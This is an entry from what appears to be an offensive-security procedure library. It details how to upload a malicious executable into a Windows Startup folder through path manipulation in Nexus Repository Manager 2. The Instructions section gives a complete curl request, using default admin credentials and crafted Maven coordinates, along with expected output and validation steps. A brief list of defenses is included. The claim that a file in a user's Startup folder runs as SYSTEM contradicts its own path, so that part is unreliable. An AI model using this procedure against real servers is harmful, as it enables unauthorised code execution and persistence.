---
id: p2b3c4d5-f6g7-8901-bcde-f2345678901
tags:
  - rce
  - maven-upload
  - startup-folder
  - privilege-escalation
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
commands: []
verified: false
platforms:
  - Web
  - Windows
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Remote File Copy]]'
  - '[[Registry Run Keys - Startup Folder]]'
updated_at: '2025-12-14T17:23:28.601Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Remote File Copy]]'
  - '[[Registry Run Keys - Startup Folder]]'
---
# Upload-Malicious-Executable-via-Maven-Artifact-Manipulation

## Summary

This procedure leverages manipulated Maven coordinates in Nexus Repository Manager 2 to upload a malicious executable to an arbitrary path, such as the Windows Startup folder, achieving persistence and remote code execution upon user login with SYSTEM-level privileges.

## Description

After creating a repository with an arbitrary storage path, attackers POST to /nexus/service/local/artifact/maven/content using multipart/form-data. By setting parameters like g=Programs (groupId for path), a=Startup (artifactId), v=. (version for dot handling), p=jar (packaging to mimic), e=exe (extension), and attaching the file (e.g., calc.exe), the unsanitized coordinates construct the full path. The file writes to the target location, executing on login due to Nexus's high privileges, enabling RCE and lateral movement.

## Requirements

1. Existing malicious repository (e.g., ID 5000) with overrideLocalStorageUrl set
2. Malicious binary file prepared (e.g., calc.exe renamed or as-is)
3. Authenticated session to Nexus

## Defense

Defensive measures and detection strategies:

- Sanitize Maven coordinates (g, a, v) to prevent path construction abuse
- Restrict file uploads to validated extensions and scan for malware
- Enable filesystem monitoring (e.g., Windows Event Logs) for writes to Startup and autologon directories; revoke high privileges from Nexus service

## Objectives

1. Write executable to persistence location
2. Achieve RCE on user interaction
3. Escalate to SYSTEM for further compromise

## Instructions

### Step 1: Prepare and Send Upload Request

**Context**: Use the repository ID and manipulate parameters to target the Startup subfolder, uploading the binary as a 'jar' but with exe extension for execution.

Execute with curl:

```bash
curl -u admin:admin123 -X POST http://nexus-server:8081/nexus/service/local/artifact/maven/content -F r=5000 -F g=Programs -F a=Startup -F v=. -F p=jar -F c=367 -F e=exe -F file=@calc.exe
```

> Parameters: r=repo ID, g/a/v for path segments, p=packaging, c=classifier (numeric for bypass), e=extension, file=binary. Expected output: 201 Created; file at C:\Users\myuser\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\calc.exe.

### Step 2: Validate File Placement and Execution

**Context**: Confirm the file is written and test execution by logging in as a user or simulating startup.

Check filesystem directly or via Nexus logs. On login, the exe runs as SYSTEM.

**Expected Output**: File present and executable launches calc.exe (or payload).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Privilege Escalation]]

### Techniques

- [[Remote File Copy]]
- [[Registry Run Keys - Startup Folder]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[maven-upload]]
- [[startup-folder]]
- [[privilege-escalation]]
